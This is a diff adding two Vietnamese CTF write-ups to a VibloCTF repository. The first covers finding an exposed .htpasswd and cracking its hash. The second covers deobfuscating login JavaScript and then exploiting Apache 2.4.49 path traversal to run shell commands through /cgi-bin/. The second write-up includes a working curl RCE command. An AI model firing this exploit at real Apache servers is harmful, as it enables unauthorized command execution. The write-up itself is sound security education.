@@ -33,6 +33,8 @@
 - [Lucky Number](https://github.com/DucThinh47/VibloCTF-Writeups#lucky-number)
 - [Login with js](https://github.com/DucThinh47/VibloCTF-Writeups#login-with-js)
 - [Config Basic](https://github.com/DucThinh47/VibloCTF-Writeups#config-basic)
+- [Cat Pictures]()
+- [Unbreakable Login]()
 #### Web7
 
 ![img](https://github.com/DucThinh47/VibloCTF-Writeups/blob/main/images/image0.png?raw=true)
@@ -1231,6 +1233,60 @@ Thấy rằng server sử dụng:
 => Khi sử dụng `alias` mà không có dấu gạch chéo ở phía sau `/static`, không phải `/static/`, `nginx` sẽ lấy phần sau `/static` và chỉ cần thêm nó vào đường dẫn `alias`, cho phép đọc file hệ thống. Tôi thử truy cập `/static../flag.txt` và tìm được flag:
 
 ![img](https://github.com/DucThinh47/VibloCTF-Writeups/blob/main/images/image143.png?raw=true)
+
+#### Cat Pictures
+
+![img](144)
+
+Dùng dirsearch, tôi tìm được endpoint ẩn là `/.htpasswd`, truy cập endpoint này, file `htpasswd` được tự động tải về với nội dung như sau:
+
+![img](145)
+
+Password đã bị mã hóa, sử dụng `hashcat`, tôi tìm được mật khẩu là `Welcome!`. Lấy thông tin đăng nhập là `Viblo:Welcome!`, truy cập `/login` và tìm được flag:
+
+![img](146)
+
+#### Unbreakable Login
+
+![img](147)
+
+Xem source code, tìm được file `/main.js`, tuy nhiên nội dung file đã bị obfuscation:
+
+![img](148)
+
+Sử dụng tool, tìm được nội dung file gốc là:
+
+    const f = document.getElementById('form');
+    const u = document.getElementById('username');
+    const p = document.getElementById('password');
+
+    f.addEventListener('submit', e => {
+    e.preventDefault();
+    const user = u.value;
+    const pass = p.value;
+    if (user === 'admin' && pass === 'admin') {
+        window.location = 'images/flag.jpg';
+    } else {
+        alert("Login failed, don't try to brute force");
+    }
+    });
+
+Thử login với thông tin đăng nhập là `admin:admin`:
+
+![img](149)
+
+Chỉ là một bức ảnh giả flag. Tôi đã thử khai thác SQLi nhưng không có hiệu quả. Xem lại request và response, tôi để ý Server được sử dụng là `Apache/2.4.49 (Unix)`, có một lỗ hổng RCE liên quan đến server này, tôi thử gọi `POST` tới `/bin/sh` (đi xuyên từ `/cgi-bin/`) và tiêm lệnh vào `STDIN`. `CGI` yêu cầu in header trước rồi mới nội dung, nên thêm `echo Content-Type: text/plain; echo`:
+
+    curl -s --path-as-is \
+    -X POST 'http://172.104.49.143:5015/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/bin/sh' \
+    -H 'Content-Type: text/plain' \
+    --data-binary $'echo Content-Type: text/plain\n\necho; id'
+
+![img](151)
+
+=> RCE thành công. Tiếp theo tìm và đọc flag:
+
+![img](152)
 
 
 
